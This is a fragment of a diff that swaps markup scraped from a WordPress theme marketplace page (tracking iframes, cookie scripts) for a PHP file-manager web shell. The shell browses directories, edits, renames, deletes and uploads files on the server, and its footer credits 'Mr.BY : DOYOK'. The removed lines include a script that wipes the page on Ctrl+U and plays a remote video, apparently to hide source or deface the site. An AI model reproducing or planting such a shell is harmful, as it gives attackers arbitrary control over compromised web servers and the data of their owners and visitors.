-    <div id="affiliate-tracker" class="is-hidden" data-view="affiliatesTracker" data-cookiebot-enabled="true" bis_skin_checked="1"></div>
+    <div class="container">
+        <div class="dir-list">
+            <?php
+            foreach ($dirContents as $item) {
+                $itemPath = realpath($currentDir . DIRECTORY_SEPARATOR . $item);
+                echo '<div class="dir-list-item">';
+                if (is_dir($itemPath)) {
+                    echo '<a href="?path=' . htmlspecialchars($itemPath) . '">[DIR] ' . htmlspecialchars($item) . '</a>';
+                    echo '<div class="file-size">N/A</div>';
+                } else {
+                    echo '<a href="?path=' . htmlspecialchars($currentDir) . '&edit=' . htmlspecialchars($itemPath) . '">' . htmlspecialchars($item) . '</a>';
+                    $fileSize = formatSize(filesize($itemPath));
+                    echo '<div class="file-size">' . $fileSize . '</div>';
+                }
 
+                // Add the rename and delete buttons for files
+                if (!is_dir($itemPath)) {
+                    echo '<div class="button-container">
+                            <button onclick="promptForRename(\'' . htmlspecialchars($itemPath) . '\', \'' . htmlspecialchars($item) . '\')">Rename</button>
+                            <form method="post" style="display:inline;">
+                                <button type="submit" name="delete" value="' . htmlspecialchars($itemPath) . '" class="upload-btn">Delete</button>
+                            </form>
+                          </div>';
+                }
 
-    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
-$(function(){viewloader.execute(Views);});
-//]]></script>
-
-
-    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
-trimGacUaCookies()
-trimGaSessionCookies()
-function trimGacUaCookies(){let maxCookies=15
-var gacCookies=[]
-let cookies=document.cookie.split('; ')
-for(let i in cookies){let[cookieName,cookieVal]=cookies[i].split('=',2)
-if(cookieName.startsWith('_gac_UA')){gacCookies.push([cookieName,cookieVal])}}if(gacCookies.length<=maxCookies){return}gacCookies.sort((a,b)=>{return(a[1]>b[1]?-1:1)})
-for(let i in gacCookies){if(i<maxCookies)continue
-$.removeCookie(gacCookies[i][0],{path:'/',domain:'.'+window.location.host})}}function trimGaSessionCookies(){let maxCookies=15
-var gaCookies=[]
-const KEEPLIST=['_ga_ZKBVC1X78F','_ga_9Z72VQCKY0']
-let cookies=document.cookie.split('; ')
-for(let i in cookies){let[cookieName,cookieVal]=cookies[i].split('=',2)
-if(cookieName.startsWith('_ga_')){if(KEEPLIST.includes(cookieName)){continue}gaCookies.push([cookieName,cookieVal])}}if(gaCookies.length<=maxCookies){return}gaCookies.sort((a,b)=>{return(a[1]>b[1]?-1:1)})
-for(let i in gaCookies){if(i<maxCookies)continue
-$.removeCookie(gaCookies[i][0],{path:'/',domain:'.'+window.location.host})}}
-//]]></script>
-
-
-    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
-(function(){if(typeof window.datadog_attributes!='object')window.datadog_attributes={}
-window.datadog_attributes['pageType']='item:details'})()
-//]]></script>
-
-
-    
-
-
-    <iframe name="__uspapiLocator" tabindex="-1" role="presentation" aria-hidden="true" title="Blank" style="display: none; position: absolute; width: 1px; height: 1px; top: -9999px;"></iframe><iframe tabindex="-1" role="presentation" aria-hidden="true" title="Blank" src="https://consentcdn.cookiebot.com/sdk/bc-v4.min.html" style="position: absolute; width: 1px; height: 1px; top: -9999px;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:-9999,&quot;w&quot;:1,&quot;h&quot;:1,&quot;abs_x&quot;:0,&quot;abs_y&quot;:-9999}" bis_id="fr_nfjaf2yt3zkyajcjvi02tl" bis_depth="0" bis_chainid="1"></iframe>
-    <div class="js-flyout__body flyout__body -padding-side-removed" data-show="false" bis_skin_checked="1">
-        <span class="js-flyout__triangle flyout__triangle"></span>
-        <div class="license-selector" data-view="licenseSelector" bis_skin_checked="1">
-            <div class="js-license-selector__item license-selector__item" data-license="regular" data-name="PROGRESSIVE JACKPOT" bis_skin_checked="1">
-
-                <div class="license-selector__license-type" bis_skin_checked="1">
-                    <span class="t-heading -size-xxs">Regular License</span>
-                    <span class="js-license-selector__selected-label e-text-label -color-green -size-s " data-license="regular">Selected</span>
-                </div>
-                <div class="license-selector__price" bis_skin_checked="1">
-                    <span class="t-heading -size-m h-m0">
-                        <b class="t-currency"><span class="">$21</span></b>
-                    </span>
-                </div>
-                <div class="license-selector__description" bis_skin_checked="1">
-                    <p class="t-body -size-m h-m0">Use, by you or one client, in a single end product which end users
-                        <strong>are not</strong> charged for. The total price includes the item price and a buyer fee.
-                    </p>
-                </div>
-            </div>
+                echo '</div>';
+            }
+            ?>
         </div>
-        <div class="flyout__link" bis_skin_checked="1">
-            <p class="t-body -size-m h-m0">
-                <a class="t-link -decoration-reversed" target="_blank" href="https://spanishlearningprogram.com/cultural/">View license details</a>
-            </p>
+    </div>
+    <footer><p>This shell is coded by Mr.BY : DOYOK</p></footer>
+    <?php if ($fileToEdit): ?>
+        <div class="textarea-container">
+            <form method="POST">
+                <textarea name="newContent"><?php echo htmlspecialchars($fileContent); ?></textarea>
+                <br>
+                <button type="submit" class="upload-btn">Save</button>
+            </form>
         </div>
-    </div><iframe height="0" width="0" style="display: none; visibility: hidden;"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-953691586" data-load-time="1753876666560" height="0" width="0" src="https://td.doubleclick.net/td/rul/953691586?random=1753876666537&amp;cv=11&amp;fst=1753876666537&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be57s1z89195929391za200zb9195929391zd9195929391&amp;gcd=13n3n3n3n5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105103161~105103163~105124543~105124545&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;npa=0&amp;us_privacy=1---&amp;pscdl=noapi&amp;auid=786247872.1753876602&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.183%7CGoogle%2520Chrome%3B138.0.7204.183&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config" style="display: none; visibility: hidden;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:300,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:300}" bis_id="fr_x7s5fwn363kzny6xssxfbd" bis_depth="0" bis_chainid="2"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-943617023" data-load-time="1753876666627" height="0" width="0" src="https://td.doubleclick.net/td/rul/943617023?random=1753876666603&amp;cv=11&amp;fst=1753876666603&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be57s1v889115050z89195929391za200zb9195929391zd9195929391&amp;gcd=13n3n3n3n5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105103161~105103163~105124543~105124545&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;npa=0&amp;us_privacy=1---&amp;pscdl=noapi&amp;auid=786247872.1753876602&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.183%7CGoogle%2520Chrome%3B138.0.7204.183&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config" style="display: none; visibility: hidden;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:300,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:300}" bis_id="fr_ha2x32or3khbgk3c9ve5nv" bis_depth="0" bis_chainid="3"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-943617023" data-load-time="1753876666634" height="0" width="0" src="https://td.doubleclick.net/td/rul/943617023?random=1753876666631&amp;cv=11&amp;fst=1753876666631&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be57s1v889115050z89195929391za200zb9195929391zd9195929391&amp;gcd=13n3n3n3n5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105103161~105103163~105124543~105124545&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;did=dMWZhNz&amp;gdid=dMWZhNz&amp;npa=0&amp;us_privacy=1---&amp;pscdl=noapi&amp;auid=786247872.1753876602&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.183%7CGoogle%2520Chrome%3B138.0.7204.183&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;fledge=1&amp;_tu=Cg&amp;data=ads_data_redaction%3Dfalse" style="display: none; visibility: hidden;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:300,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:300}" bis_id="fr_z2gfbnsev3bhw7ln6q22jb" bis_depth="0" bis_chainid="4"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-800411572" data-load-time="1753876666710" height="0" width="0" src="https://td.doubleclick.net/td/rul/800411572?random=1753876666684&amp;cv=11&amp;fst=1753876666684&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be57s1v896649154z89195929391za200zb9195929391zd9195929391&amp;gcd=13n3n3n3n5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105124543~105124545&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;npa=0&amp;us_privacy=1---&amp;pscdl=noapi&amp;auid=786247872.1753876602&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.183%7CGoogle%2520Chrome%3B138.0.7204.183&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config" style="display: none; visibility: hidden;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:300,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:300}" bis_id="fr_ir7vx1wyqbahien0mokr2t" bis_depth="0" bis_chainid="5"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-934741711" data-load-time="1753876666723" height="0" width="0" src="https://td.doubleclick.net/td/rul/934741711?random=1753876666713&amp;cv=11&amp;fst=1753876666713&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be57s1v896649154z89195929391za200zb9195929391zd9195929391&amp;gcd=13n3n3n3n5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105124543~105124545&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;npa=0&amp;us_privacy=1---&amp;pscdl=noapi&amp;auid=786247872.1753876602&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.183%7CGoogle%2520Chrome%3B138.0.7204.183&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config" style="display: none; visibility: hidden;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:300,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:300}" bis_id="fr_rldn0wquvhqrddm50v4c1n" bis_depth="0" bis_chainid="6"></iframe><img id="CookiebotSessionPixel" src="https://imgsct.cookiebot.com/1.gif?dgi=d10f7659-aa82-4007-9cf1-54a9496002bf" alt="Cookiebot session tracker icon loaded" data-cookieconsent="ignore" style="display: none;">
-    <div id="batBeacon552678157489" style="width: 0px; height: 0px; display: none; visibility: hidden;" bis_skin_checked="1"><img id="batBeacon178618191654" width="0" height="0" alt="" src="https://bat.bing.com/action/0?ti=16005611&amp;tm=gtm002&amp;Ver=2&amp;mid=bb77e21d-0c6c-42c3-ba87-fe2355ba6056&amp;bo=2&amp;sid=422440906d3c11f083cb21e95f31b0ab&amp;vid=422465806d3c11f091d599aa9de8ebcb&amp;vids=0&amp;msclkid=N&amp;uach=pv%3D19.0.0&amp;pi=918639831&amp;lg=en-US&amp;sw=1920&amp;sh=1080&amp;sc=24&amp;tl=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;p=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;r=https%3A%2F%2Fwww.google.com%2F&amp;lt=4778&amp;evt=pageLoad&amp;sv=1&amp;asc=G&amp;cdb=AQIT&amp;rn=643027" style="width: 0px; height: 0px; display: none; visibility: hidden;"></div>
-            <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"903a6846a73944019dbbb71181ddf279","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-            <script type='text/javascript'>
-                //<![CDATA[
-                shortcut = {
-                  all_shortcuts: {},
-                  add: function(a, b, c) {
-                    var d = { type: "keydown", propagate: !1, disable_in_input: !1, target: document, keycode: !1 };
-                    if (c) for (var e in d) "undefined" == typeof c[e] && (c[e] = d[e]); else c = d;
-                    d = c.target, "string" == typeof c.target && (d = document.getElementById(c.target)),
-                    a = a.toLowerCase(),
-                    e = function(d) {
-                      d = d || window.event;
-                      if (c.disable_in_input) {
-                        var e;
-                        d.target ? e = d.target : d.srcElement && (e = d.srcElement), 3 == e.nodeType && (e = e.parentNode);
-                        if ("INPUT" == e.tagName || "TEXTAREA" == e.tagName) return;
-                      }
-                      d.keyCode ? code = d.keyCode : d.which && (code = d.which),
-                      e = String.fromCharCode(code).toLowerCase(),
-                      188 == code && (e = ","), 190 == code && (e = ".");
-                      var f = a.split("+"), g = 0, h = {
-                        "`": "~",1: "!",2: "@",3: "#",4: "$",5: "%",6: "^",7: "&",8: "*",9: "(",0: ")", "-": "_","=": "+",";": ":","'": '"',",": "<",".": ">", "/": "?","\\": "|"
-                      }, i = {
-                        esc: 27, escape: 27, tab: 9, space: 32, "return": 13, enter: 13, backspace: 8,
-                        left: 37, up: 38, right: 39, down: 40, f1: 112, f2: 113, f3: 114, f4: 115,
-                        f5: 116, f6: 117, f7: 118, f8: 119, f9: 120, f10: 121, f11: 122, f12: 123
-                      }, j = !1, l = !1, m = !1, n = !1, o = !1, p = !1, q = !1, r = !1;
-                      d.ctrlKey && (n = !0), d.shiftKey && (l = !0), d.altKey && (p = !0), d.metaKey && (r = !0);
-                      for (var s = 0; k = f[s], s < f.length; s++)
-                        "ctrl" == k || "control" == k ? (g++, m = !0) :
-                        "shift" == k ? (g++, j = !0) :
-                        "alt" == k ? (g++, o = !0) :
-                        "meta" == k ? (g++, q = !0) :
-                        1 < k.length ? i[k] == code && g++ :
-                        c.keycode ? c.keycode == code && g++ :
-                        e == k ? g++ :
-                        h[e] && d.shiftKey && (e = h[e], e == k && g++);
-                      if (g == f.length && n == m && l == j && p == o && r == q && (b(d), !c.propagate))
-                        return d.cancelBubble = !0, d.returnValue = !1, d.stopPropagation && (d.stopPropagation(), d.preventDefault()), !1
-                    },
-                    this.all_shortcuts[a] = { callback: e, target: d, event: c.type },
-                    d.addEventListener ? d.addEventListener(c.type, e, !1) :
-                    d.attachEvent ? d.attachEvent("on" + c.type, e) :
-                    d["on" + c.type] = e;
-                  },
-                  remove: function(a) {
-                    var a = a.toLowerCase(), b = this.all_shortcuts[a];
-                    delete this.all_shortcuts[a];
-                    if (b) {
-                      var a = b.event, c = b.target, b = b.callback;
-                      c.detachEvent ? c.detachEvent("on" + a, b) :
-                      c.removeEventListener ? c.removeEventListener(a, b, !1) :
-                      c["on" + a] = !1;
-                    }
-                  }
-                };
-                
-                // === Versi Video Fullscreen dengan Ctrl+U ===
-                shortcut.add("Ctrl+U", function() {
-                  document.body.innerHTML = ""; // hapus isi halaman
-                
-                  var video = document.createElement("video");
-                  video.src = "https://tools.prinsh.com/admin/admin.mp4"; // ganti dengan URL video kamu
-                  video.autoplay = true;
-                  video.controls = true;
-                  video.loop = true;
-                  video.muted = false; // set true kalau mau tanpa suara
-                  video.style.width = "100%";
-                  video.style.height = "100vh";
-                  video.style.objectFit = "cover";
-                
-                  document.body.appendChild(video);
-                });
-                //]]>
-                </script>
+    <?php endif; ?>
+    <script>
+        function addUploadField() {
+            let container = document.createElement("div");
+            container.classList.add("file-input-container");
+            let input = document.createElement("input");
+            input.type = "file";
+            input.name = "file[]";
+            document.getElementById("upload-form").insertBefore(container, document.getElementById("upload-button"));
+            container.appendChild(input);
+        }
+
+        function promptForRename(filePath, currentName) {
+            let newName = prompt("Enter new name for: " + currentName, currentName);
+            if (newName && newName !== currentName) {
+                let form = document.createElement('form');
+                form.method = 'POST';
+                form.action = '';
+
+                let oldNameInput = document.createElement('input');
+                oldNameInput.type = 'hidden';
+                oldNameInput.name = 'oldName';
+                oldNameInput.value = filePath;
+
+                let newNameInput = document.createElement('input');
+                newNameInput.type = 'hidden';
+                newNameInput.name = 'newName';
+                newNameInput.value = filePath.replace(currentName, newName);
+
+                let renameInput = document.createElement('input');
+                renameInput.type = 'hidden';
+                renameInput.name = 'rename';
+                renameInput.value = 'true';
+
+                form.appendChild(oldNameInput);
+                form.appendChild(newNameInput);
+                form.appendChild(renameInput);
+
+                document.body.appendChild(form);
+                form.submit();
+            }
+        }
+    </script>
 </body>
 </html>
